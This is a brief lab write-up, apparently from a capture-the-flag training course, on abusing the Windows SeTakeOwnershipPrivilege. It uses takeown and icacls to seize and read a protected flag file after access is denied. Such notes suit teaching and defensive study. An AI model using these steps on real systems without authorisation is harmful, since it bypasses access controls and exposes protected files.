This privilege grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.

```bash
PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Trying to access protected file:

```bash
PS C:\Tools> type C:\TakeOwn\flag.txt
type : Access to the path 'C:\TakeOwn\flag.txt' is denied.
```

Taking ownership of the file

```bash
takeown /f 'C:\TakeOwn\flag.txt'
```

If viewing the file still doesn't work, modify the permissions:

```bash
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
```

